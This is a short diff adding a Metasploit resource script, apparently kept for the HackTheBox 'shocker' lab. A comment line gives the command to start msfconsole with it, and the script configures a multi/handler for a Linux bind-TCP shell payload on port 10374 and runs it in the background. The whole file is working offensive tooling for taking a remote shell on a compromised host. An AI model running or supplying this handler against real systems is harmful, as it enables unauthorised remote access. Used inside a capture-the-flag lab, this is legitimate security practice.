@@ -1,0 +1,9 @@
+#
+# [Kali 2.x]:   systemctl start postgresql; msfdb start; msfconsole -q -r '/home/heimdall/Documents/dev/Sec/hackmes/hackthebox-eu/shocker/linux-shell-staged-bind-tcp-10374-elf.rc'
+#
+use exploit/multi/handler
+set PAYLOAD linux/x86/shell/bind_tcp
+set RHOST 0.0.0.0
+set LPORT 10374
+set ExitOnSession false
+run -j
